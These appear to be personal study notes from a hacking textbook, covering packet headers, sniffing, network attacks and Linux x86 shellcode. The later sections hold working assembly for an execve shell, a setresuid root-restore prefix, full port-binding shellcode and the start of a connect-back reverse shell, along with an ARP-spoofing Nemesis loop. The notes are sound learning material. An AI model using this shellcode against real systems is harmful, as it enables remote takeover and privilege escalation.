  - **Header** - The header is composed of the source and destination MAC addresses of the frame in question. Optionally this can contain a 802.1Q or 802.1ad (VLAN) tags.
    - The EtherType field is normally used to display the size of the payload, but in a sitaiton in which the payload is over 1536, this field will be used to display the ptotocol encapsulated by the frame and in that case the length will be placed in the interpacket gap
  - **Payload** - A variable length field which contains headers and data for higher layers
  - **Frame Check Sequence** - a value computed as a function of the device MAC adresses, provides error checking. 

![Ethernet](https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Ethernet_frame.svg/1920px-Ethernet_frame.svg.png) 

#### Network
At this layer, the data is placed into packets and these packets, of course have a multitude of fields centered around getting data from a source address to a destination address in another network. 

```
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Source Address                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Destination Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             Note that one tick mark represents one bit position.

```
*Source [RFC791](https://www.rfc-editor.org/rfc/rfc791)*

While there are a lot of fields in this address I will point out ones of particular importance
- **Source/Desttination Address** - On the internet, This field contains the first publicly routable IP address (usually your gateway) with that of the destination server or device in question
- **TTL** - This displays the number of "Hops" or devices that this packet can traverse before it disappears (used to prevent infinitely lost packets from cluttering the internet) every time a packet hits a new device this number is decremented
- **Flags** - mainly used to specify if a packet will be frangmented or not
- **Fragment offset** - used to help put large packets that have been fragmented back together again

#### Transport
THe transport layer also has a multitude of fields, this time centered around ports and synchronization numbers. This layer is used to ensure reliable communication over the internet.
```
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                        Sequence Number                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Acknowledgment Number                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Data |       |C|E|U|A|P|R|S|F|                               |
   | Offset| Rsrvd |W|C|R|C|S|S|Y|I|            Window             |
   |       |       |R|E|G|K|H|T|N|N|                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |           Checksum            |         Urgent Pointer        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                           [Options]                           |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                                                               :
   :                             Data                              :
   :                                                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

          Note that one tick mark represents one bit position.
```
*Source: [RFC9293](https://www.rfc-editor.org/rfc/rfc9293)*

While there are many fields here, the most important are
- **Sequence/Acknowledgement Numbers** - These numbers are used betweent he client and the server in a two way comunication to synchronize the flow of communication and ensure no packets are lost within a conversation. They will change throughgout the conversation as a result of the volume of traffic sent.
- **Flags** - TCP has various flags to use as a form of flow control. Ther are as follows
  - <details>

    <table class="tg">
    <thead>
      <tr>
        <th class="tg-uzvj">TCP flag</th>
        <th class="tg-wa1i">Meaning</th>
        <th class="tg-wa1i">Purpose</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td class="tg-cly1">URG</td>
        <td class="tg-cly1">Urgent</td>
        <td class="tg-cly1">Identifies important data</td>
      </tr>
      <tr>
        <td class="tg-cly1">ACK</td>
        <td class="tg-cly1">Acknowledgment</td>
        <td class="tg-cly1">Acknowledges a packet; it is turned on for the majority of the connection</td>
      </tr>
      <tr>
        <td class="tg-cly1">PSH</td>
        <td class="tg-cly1">Push</td>
        <td class="tg-cly1">Tells the receiver to push the data through instead of buffering it</td>
      </tr>
      <tr>
        <td class="tg-cly1">RST</td>
        <td class="tg-cly1">Reset</td>
        <td class="tg-cly1">Resets a connection</td>
      </tr>
      <tr>
        <td class="tg-cly1">SYN</td>
        <td class="tg-cly1">Synchronize</td>
        <td class="tg-cly1">Synchronizes sequence numbers at the beginning of a connection</td>
      </tr>
      <tr>
        <td class="tg-cly1">FIN</td>
        <td class="tg-cly1">Finish</td>
        <td class="tg-cly1">Gracefully closes a connection when both sides say goodbye</td>
      </tr>
    </tbody>
    </table>
   </details>

### Network Sniffing
#### Definitions/Concepts to know
- In an unswitched network data is delivered to all devices regardless of intent, this is patched in switched networks
  - Even in a switched network, you can sniff traffic not meant for you by going into promiscuous mode.
- ```tcpdump``` - A command line utility used to sniff traffic
- ```dsniff``` - sniffer specifically designed to look for user/pass
- **Raw Sockets** - provides direct access to lower level protocols and data must be explicitly handled by the program.
  - specified by ```SOCK_RAW```
  - programs that handle raw sockets need root permissions.
- ```Nemesis``` is a command line utility used to spoof network traffic
  - Nemesis typically does single commands for requests, but it can be combined with some bash scripting to send bogus arp requests every 10s
    ```
      reader@hacking:~/booksrc $ while true
      > do
      > sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h
      00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M 
      00:C0:F0:79:3D:30
      > sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h 
      00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M 
      00:50:18:00:0F:01
      > echo "Redirecting..."
      > sleep 10
      > done
      ```

### Attacks
#### Definitions/Concepts to know
- **ARP Poisoning** is a man in the middle style attack that takes advantage of the fact that ARP requests, used to pair IP addresses with MACs, are stateless and machines accept replies without valid requests
- **SYN FLood** exhausts the connection states of a device by attempting to open a bunch of TCP connections without sending any information
  - This is prevented in linux via SYN cookies, which adjust initial ack numbers with info based on gost details, the connections dont become active unless the final ack is checked. This is done because ack packets require actual info to be sent.    
- **Ping of Death** occurs because the max ICMP echo size was 65538 bytes and people would purposefully send packets larger than this to crash systems. 
- **Teardrop** exploits a vulnerability in TCP fragmentation in which the numbers are supposed to reassemble packets with no overlap, if overlap occured it could cause programs to crash.
- **Amplification attacks** take advantage of broadcast domains by pinging the broadcast address with the spoofed IP of the victim causing all devices in the domain to reply to the request to the victim. 
- **TCP/IP Hijacking** - grabs the sequence and acknowledgement numbers from a legitimate connection (usually something that uses one time passwords) and spoofs its IP address along with the proper sequence and acknowledgement numbers for a man on the side style attack

## x500
### Shellcode
#### Definitions/Concepts to know
- Shellcode isnt C, but the underlying assembly instructions used to create system calls via interrupts and such, in a C program you can trace a program's system calls via the ```strace``` command
  - Each linux system call should have a well documented ```man``` page
  - Each linux system call also has an unique number that assembly uses to reference it. These system calld will be executed using system interrupts via the ```int``` assembly instruction.
    - When int is called:
      - ```EAX``` is the system call to make
      - ```EBX, ECX, EDX``` hold the first second, and third arguments, these can be set with the ```mov``` instruction
- ```nasm``` is used to assemble assembly code, ```ndisasm``` does the opposite
  - with the ```-f elf``` flag it can create a standalone binary, although it will need to be linked with ```ld``` after
- Shellcode is injected into a running process much like a virus infecting a cell.
  - because of this, you cant declare memory as you would in a standalone executable. So shellcode must be able to execute regardless of current memory state, this is reffered to as position independent code.
- Stack based ecploits take advantage of the ```call``` instruction's control of execution flow via the return address.
  - If a function is called, your next instruction becomes the return address, if this is declaring your variable, this will be pushed to the stack in which it can be popped off and used without specifying an exact memory location.
- GDB Can be attached to coredumps, but if you want a sizeable one, make sure to use ```ulimit -c unlimited``` to move the restrictions on size after which you can simply use ```gdb -q -c ./core```

#### Fixing NULL bytes
On 32bit architecture, shell code that contains NULL bytes will be stripped, which can cause some issues with the shell code. There are a few techniques you can use to avoid this.
- For this section the following shellcode will be the example.
  ```
  BITS 32             ;  Tell nasm this is 32-bit code.

    call mark_below   ;  Call below the string to instructions
    db "Hello, world!",  0x0a, 0x0d  ; with newline and carriage return bytes.

  mark_below:
  ; ssize_t write(int fd,  const void *buf, size_t count);
    pop ecx           ; Pop  the return address (string ptr) into ecx.
    mov eax, 4        ; Write  syscall #.
    mov ebx, 1        ; STDOUT  file descriptor
    mov edx, 15       ; Length of the string
    int 0x80          ; Do syscall: write(1, string, 14)

  ; void _exit(int status);
    mov eax, 1        ; Exit syscall #
    mov ebx, 0        ; Status = 0
    int 0x80          ; Do syscall:  exit(0)
  ```
- **Function Calls** - Function calls are used to jump large stretches of memory, but in a smaller piece of self contained code, this will cause issues as it occupies only a small portion of memory, which will lead to these small jumps being padded with nulls.
  - To avoid this, we can use ```jmp``` instructions whhich can use shorts to jump to a location in memory, then we can use a call function to go to a previous section in memory which will result in the ```call``` function using a larger twos complement to represent a negative value. 
    - <details><summary>Example</summary>

        ```
        BITS 32             ;  Tell nasm this is 32-bit code.

        jmp short one       ;  Jump down to a call at the end.

        two:
        ; ssize_t write(int fd,  const void *buf, size_t count);
          pop ecx           ;  Pop the return address (string ptr) into ecx.
          mov eax, 4        ;  Write syscall #.
          mov ebx, 1        ;  STDOUT file descriptor
          mov edx, 15       ;  Length of the string
          int 0x80          ;  Do syscall: write(1, string, 14)

        ; void _exit(int status);
          mov eax, 1        ; Exit syscall #
          mov ebx, 0        ; Status = 0
          int 0x80          ; Do syscall: exit(0)

        one:
          call two   ; Call back upwards to avoid null bytes
          db "Hello, world!", 0x0a, 0x0d ; with newline and carriage return bytes.
        ```
      </details> 
- **```MOV``` instructions**
  - EAX, EBX, ECX, EDX, ESI, EDI, EBP, and ESP registers are 32 bits in width but they all have a 16 buit counterpart which simply removes the E (for extended). Within these 16 bit counterparts, the high 8 or the low 8 bits can be addresses individially int he case of ```AX``` using ```AH``` and ```AL``` respectively allowing for a n 8 bit instruction. 
    <details>
      <table>
      <thead>
        <tr>
          <th>Machine code</th>
          <th>Assembly</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>B8 04 00 00 00</td>
          <td>mov eax,0x4</td>
        </tr>
        <tr>
          <td>66 B8 04 00</td>
          <td>mov ax,0x4</td>
        </tr>
        <tr>
          <td>B0 04</td>
          <td>mov al,0x4</td>
        </tr>
      </tbody>
      </table>
    </details>

    - Using this method does have one big caveat. Since the upper 8 bits of the register can contain anything, it is best to zero out the register before using it. This is most easily done via executing an ```xor``` function on a register against itself resulting in all 0s. EX:   ```xor eax,eax```
      - <details><summary>Example</summary>

          ```
          BITS 32             ;  Tell nasm this is 32-bit code.

          jmp short one       ;  Jump down to a call at the end.

          two:
          ; ssize_t write(int fd,  const void *buf, size_t count);
            pop ecx           ; Pop  the return address (string ptr) into ecx.
            xor eax, eax      ; Zero  out full 32 bits of eax register.
            mov al, 4         ; Write  syscall #4 to the low byte of eax.
            xor ebx, ebx      ; Zero out ebx.
            inc ebx           ; Increment ebx to 1,  STDOUT file descriptor.
            xor edx, edx
            mov dl, 15        ; Length of the string
            int 0x80          ; Do syscall: write(1, string, 14)

          ; void _exit(int status);
            mov al, 1        ; Exit syscall #1, the top 3 bytes are still zeroed.
            dec ebx          ; Decrement ebx back down to 0 for status = 0.
            int 0x80         ; Do syscall: exit(0)

          one:
            call two   ; Call back upwards to avoid null bytes
            db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes.
          ```
          </details>

#### Spawning shells
As stated before, shell code's magic lies in the fact that everything your operating ystsem does is via collection of system calls, each of these system calls can be executed with some simple assembly, and one of the most pertinent for this topic is system call #11, ```execve()```
  - <details>

      ```

        EXECVE(2)                  Linux Programmer's Manual                 EXECVE(2)

        NAME
              execve - execute program

        SYNOPSIS
              #include <unistd.h>

              int execve(const char *filename, char *const argv[],
                          char *const envp[]);

        DESCRIPTION
              execve() executes the program pointed to by filename. Filename must be
              either a binary executable, or a script starting with a line of  the
              form  "#! interpreter [arg]". In the latter case, the interpreter must
              be a valid pathname for an executable which is not itself a  script,
              which will be invoked as interpreter [arg] filename.

              argv is an array of argument strings passed to the new program. envp
              is an array of strings, conventionally of the form key=value, which are
              passed as environment to the new program. Both argv and envp must be
              terminated by a null pointer. The argument vector and environment can
              be accessed by the called program's main function, when it is defined
              as int main(int argc, char *argv[], char *envp[]).
      ```
    </details>
  - When called in our case the arguments will contain
    - **Filename** - A pointer to the string "/bin/sh"
    - **Args list** - empty (use a 32b null pointer)
    - **Env list** - empty (use a 32b null pointer)

The assembly looks a little like this:
```
BITS 32

  jmp short two     ; Jump down to the bottom for the call trick.
one:
; int execve(const char *filename, char *const argv [], char *const envp[])
  pop ebx           ; Ebx has the addr of the string.
  xor eax, eax      ; Put 0 into eax.
  mov [ebx+7], al   ; Null terminate the /bin/sh string.
  mov [ebx+8], ebx  ; Put addr from ebx where the AAAA is.
  mov [ebx+12], eax ; Put 32-bit null terminator where the BBBB is.
  lea ecx, [ebx+8]  ; Load the address of [ebx+8] into ecx for argv ptr.
  lea edx, [ebx+12] ; Edx = ebx + 12, which is the envp ptr.
  mov al, 11        ; Syscall #11
  int 0x80          ; Do it.

two:
  call one          ; Use a call to get string address.
  db '/bin/shXAAAABBBB'     ; The XAAAABBBB bytes aren't needed.
```
This results in the registers looking like:
  - EAX = 11
  - EBX = '\bin\sh'
  - ECX = 'AAAA' (in a real world case. this is a pointer to NULL)
  - EDX = 'BBBB' (in a real world case. this is a pointer to NULL) \
Or ```execvue('/bin/sh', [AAAA], [BBBB])```

*Note* Remove ```XAAAABBBB``` from the real shellcode

#### Privesc
Because some functions dont need to be run with root privileges, even in ```suid``` situations, sometimes programs drop privileges before executing potentially dangerous functions. In doing so , they use the ```seteuid()``` call, we are going to use the opposit call, ```setresuid()``` to uno reverse them. 
<details>
<summary>SETEGID MAN</summary>

  ```
  SETEGID(2)                 Linux Programmer's Manual                SETEGID(2)

  NAME
        seteuid, setegid - set effective user or group ID

  SYNOPSIS
        #include <sys/types.h>
        #include <unistd.h>

        int seteuid(uid_t euid);
        int setegid(gid_t egid);

  DESCRIPTION
        seteuid() sets the effective user ID of the current process.
        Unprivileged user processes may only set the effective user ID to
        ID to the real user ID, the effective user ID or the saved set-user-ID.
        Precisely the same holds for setegid() with "group" instead of "user".

  RETURN VALUE
        On success, zero is returned. On error, -1 is returned, and errno is
        set appropriately.
  ```
</details>
<details>
<summary>SETRESUID MAN</summary>

  ```
  SETRESUID(2)                                                                   Linux Programmer's Manual                                                                   SETRESUID(2)

  NAME
        setresuid, setresgid - set real, effective and saved user or group ID

  SYNOPSIS
        #define _GNU_SOURCE         /* See feature_test_macros(7) */
        #include <unistd.h>

        int setresuid(uid_t ruid, uid_t euid, uid_t suid);
        int setresgid(gid_t rgid, gid_t egid, gid_t sgid);

  DESCRIPTION
        setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.

        An unprivileged process may change its real UID, effective UID, and saved set-user-ID, each to one of: the current real UID, the current effective UID or the current saved set-
        user-ID.

        A privileged process (on Linux, one having the CAP_SETUID capability) may set its real UID, effective UID, and saved set-user-ID to arbitrary values.

        If one of the arguments equals -1, the corresponding value is not changed.

        Regardless of what changes are made to the real UID, effective UID, and saved set-user-ID, the filesystem UID is always set to the same value as the  (possibly  new)  effective
        UID.

        Completely  analogously,  setresgid()  sets the real GID, effective GID, and saved set-group-ID of the calling process (and always modifies the filesystem GID to be the same as
        the effective GID), with the same restrictions for unprivileged processes.

  RETURN VALUE
        On success, zero is returned.  On error, -1 is returned, and errno is set appropriately.

        Note: there are cases where setresuid() can fail even when the caller is UID 0; it is a grave security error to omit checking for a failure return from setresuid().

  ```
</details>

In doing so we must simply add a function that calls ```setresuid()``` with no arguments before calling our shell code, like this 
```
; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; Zero out eax.
  xor ebx, ebx      ; Zero out ebx.
  xor ecx, ecx      ; Zero out ecx.
  xor edx, edx      ; Zero out edx.
  mov al,  0xa4     ; 164 (0xa4) for syscall #164
  int 0x80          ; setresuid(0, 0, 0)  Restore all root privs.

```


#### Shrinking Code
Because memory constraints are real we must do what we can to shrink our shell code (even though we just talked about adding padding to remove null bytes) to ensure our code can fit in these small windows that we want to execute them in. To do so, we're going to get rid of our functions and use the stack and our registers a bit more efficiently to save some bytes. 
```
BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; Zero out eax.
  push eax          ; Push some nulls for string termination.
  push 0x68732f2f   ; Push "//sh" to the stack.
  push 0x6e69622f   ; Push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx, via esp.
  push eax          ; Push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; Push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  mov al, 11        ; Syscall #11.
  int 0x80          ; Do it.
  ```
  This code ```push```es the bytes to the stack and ```mov```es them into the ```ebx``` register ```esp``` as its relative address for reference *Note: please pay attention to the endianess before pushing your strings to the stack as well as the stack's FILO nature*

  Another tip is to zero out ```ebx``` using **```cqd```**, qhich creates a quadword using the ```eax``` and ```edx``` registers, if ```eax``` is 0, it will flow into ```edx```. 

  Also when values are popped off the stack, they are sign extended to fill the whole register, in whis case you can add a number to the stack and pop it off into a register like ```eax``` when filling a syscall with a small number. This removes null bytes and saves space
  ```
  	6A 0B            push BYTE 11
	  58               pop eax
  ```
<details>
<summary>See these in action</summary>

  ```
  BITS 32

  ; setresuid(uid_t ruid, uid_t euid, uid_t suid);
    xor eax, eax      ; Zero out eax.
    xor ebx, ebx      ; Zero out ebx.
    xor ecx, ecx      ; Zero out ecx.
    cdq               ; Zero out edx using the sign bit from eax.
    mov BYTE al, 0xa4 ; syscall 164 (0xa4)
    int 0x80          ; setresuid(0, 0, 0)  Restore all root privs.

  ; execve(const char *filename, char *const argv [], char *const envp[])
    push BYTE 11      ; push 11 to the stack.
    pop eax           ; pop the dword of 11 into eax.
    push ecx          ; push some nulls for string termination.
    push 0x68732f2f   ; push "//sh" to the stack.
    push 0x6e69622f   ; push "/bin" to the stack.
    mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
    push ecx          ; push 32-bit null terminator to stack.
    mov edx, esp      ; This is an empty array for envp.
    push ebx          ; push string addr to stack above null terminator.
    mov ecx, esp      ; This is the argv array with string ptr.
    int 0x80 
  ```
</details>

### Port Binding Shellcode
#### Opening a socket
When executing a remote process typical shellcode does you no good since it spawns the process on the remote host, to get around that, we're going to combine our knowledge of sockets with shellcode and enable remote C2
**Socketcall** - all linux socket functions are handled via the ```socketcall()``` system call with the appropriate arguments.
```
IPC(2)                     Linux Programmer's Manual                     IPC(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall() is a common kernel entry point for the socket system calls. call
       determines which socket function to invoke. args points to a block containing
       the actual arguments, which are passed through to the appropriate call.

       User programs should call  the  appropriate  functions  by  their  usual
       names.   Only  standard  library implementors and kernel hackers need to
       know about socketcall().
```
Socket calls are kind of weird in the fact that they are system calls themselves, but call their arguments like the governing systemcall. The syscall # for ```socketcall``` is #102, and its call #s are found in ```/usr/include/linux/net.h```, the last argument is the pointer for the arguments for the underlying socket call usually in an ```sock-addr``` struct.Your resulting shell-code will start with a socket declaration that will look something like this:
<details>

```
  BITS 32

  ; s = socket(2, 1, 0)
    push BYTE 0x66    ; socketcall is syscall #102 (0x66).
    pop eax
    cdq               ; Zero out edx for use as a null DWORD later.
    xor ebx, ebx      ; ebx is the type of socketcall.
    inc ebx           ; 1 = SYS_SOCKET = socket()
    push edx          ; Build arg array: { protocol = 0,
    push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
    push BYTE 0x2     ;                    AF_INET = 2 }
    mov ecx, esp      ; ecx = ptr to argument array
    int 0x80          ; After syscall, eax has socket file descriptor.

    mov esi, eax      ; save socket FD in esi for later

  ; bind(s, [2, 31337, 0], 16)
    push BYTE 0x66    ; socketcall (syscall #102)
    pop eax
    inc ebx           ; ebx = 2 = SYS_BIND = bind()
    push edx          ; Build sockaddr struct:  INADDR_ANY = 0
    push WORD 0x697a  ;   (in reverse order)    PORT = 31337
    push WORD bx      ;                         AF_INET = 2
    mov ecx, esp      ; ecx = server struct pointer
    push BYTE 16      ; argv: { sizeof(server struct) = 16,
    push ecx          ;         server struct pointer,
    push esi          ;         socket file descriptor }
    mov ecx, esp      ; ecx = argument array
    int 0x80          ; eax = 0 on success

  ; listen(s, 0)
    mov BYTE al, 0x66 ; socketcall (syscall #102)
    inc ebx
    inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
    push ebx          ; argv: { backlog = 4,
    push esi          ;         socket fd }
    mov ecx, esp      ; ecx = argument array
    int 0x80

  ; c = accept(s, 0, 0)
    mov BYTE al, 0x66 ; socketcall (syscall #102)
    inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
    push edx          ; argv: { socklen = 0,
    push edx          ;         sockaddr ptr = NULL,
    push esi          ;         socket fd }
    mov ecx, esp      ; ecx = argument array
    int 0x80          ; eax = connected socket FD
  ``` 
</details>

<details>

<summary>C code for reference</summary>

  ```c
  #include <unistd.h>
  #include <string.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>

  int main(void) {
    int sockfd, new_sockfd;  // Listen on sock_fd, new connection on new_fd
    struct sockaddr_in host_addr, client_addr;   // My address information
    socklen_t sin_size;
    int yes=1;

    sockfd = socket(PF_INET, SOCK_STREAM, 0);

    host_addr.sin_family = AF_INET;         // Host byte order
    host_addr.sin_port = htons(31337);      // Short, network byte order
    host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.
    memset(&(host_addr.sin_zero), '\0', 8); // Zero the rest of the struct.

    bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));

    listen(sockfd, 4);
    sin_size = sizeof(struct sockaddr_in);
    new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
  }
  ```
</details>

Since all the needed calls to bind a port (```socket```, ```bind```. ```listen```, and ```accept```) are all sequential, you can save some bytes by ```inc```remening ```ebx``` and reusing data held in registers like ```edx``` and ```esi``` to make your code a bit more compact and efficient 

#### Std I/O
Standard input outout and error are all file descritors your computer uses to send and recieve data from a user, since we are going to need to capture and send data to a user we have to duplicate these file descriptors and use them to send/recieve data though our socket. We will use the ```dup2``` as it it capable of duplicating out socket (```c```) into what will be known to the program as stdin, stdout, and stderr.
```
DUP(2)                     Linux Programmer's Manual                     DUP(2)

NAME
       dup, dup2 - duplicate a file descriptor

SYNOPSIS
       #include <unistd.h>
       int dup(int oldfd);
       int dup2(int oldfd, int newfd);

DESCRIPTION
       dup() and dup2() create a copy of the file descriptor oldfd.

       dup2() makes newfd be the copy of oldfd, closing newfd first if necessary.
```
Calling dup2 is pretty simple as the only arguments that are require dis its syscall #63, the old fd and the new fd. The additions to the shellcode above will look like this. 
<details>

  ```
  ; dup2(connected socket, {all three standard I/O file descriptors})
    mov ebx, eax      ; Move socket FD in ebx.
    push BYTE 0x3F    ; dup2  syscall #63
    pop eax
    xor ecx, ecx      ; ecx = 0 = standard input
    int 0x80          ; dup(c, 0)
    mov BYTE al, 0x3F ; dup2  syscall #63
    inc ecx           ; ecx = 1 = standard output
    int 0x80          ; dup(c, 1)
    mov BYTE al, 0x3F ; dup2  syscall #63
    inc ecx           ; ecx = 2 = standard error
    int 0x80          ; dup(c, 2)

  ; execve(const char *filename, char *const argv [], char *const envp[])
    mov BYTE al, 11   ; execve  syscall #11
    push edx          ; push some nulls for string termination.
    push 0x68732f2f   ; push "//sh" to the stack.
    push 0x6e69622f   ; push "/bin" to the stack.
    mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
    push ecx          ; push 32-bit null terminator to stack.
    mov edx, esp      ; This is an empty array for envp.
    push ebx          ; push string addr to stack above null terminator.
    mov ecx, esp      ; This is the argv array with string ptr.
    int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
  ```
</details>

Since these pieces of shell code are becoming quite large we employ even more of the tricks in our bad to shorten some instructions. 
- Firstoff, we're goinf to shorten the dup instruction by creating a for loop that will execute three times with the value of STD incrementing between 0, 1,and 2. TO save even more, we cheat in the loop a bit and avoid using the ```cmp``` operator by simmply telling the program to loop again unless you encounter a signed value ```jns``` in our case, we'll only encounter that if our incrementer drops below 0. 
- After that in our code we take advantage of the ```xchg``` instruction that can exchange the value of two registers, which comes in handy for sitations in which we need to move a value into ```ebx``` while clearing out ```eax``` after these changes, our final binding shellcode will look like this: 

```
BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66).
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later.
  xor ebx, ebx      ; Ebx is the type of socketcall.
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor.

  xchg esi, eax     ; Save socket FD in esi for later.

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD

; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx     ; Put socket FD in ebx and 0x00000005 in eax.
  push BYTE 0x2     ; ecx starts at 2.
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0
  jns dup_loop      ; If the sign flag is not set, ecx is not negative.

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push edx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```
### Reverse Shells
Since firewall policy can prevent a lot of por binding exokiuts from working, you can have a machine call back to your attackling host with a shell binded to a connection. To do so you simply have to use the code from above but instead use a ```connect()``` socket call. Since this problem did not exist with the port binding, because we listened on all IPs, it is important to note that your IP address must be stores in little endian notation. 
```
BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66).
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later.
  xor ebx, ebx      ; ebx is the type of socketcall.
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor.

  xchg esi, eax     ; Save socket FD in esi for later.

; connect(s, [2, 31337, <IP address>], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  inc ebx           ; ebx = 2 (needed for AF_INET)
  push DWORD 0x482aa8c0 ; Build sockaddr struct: IP address = 192.168.42.72
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
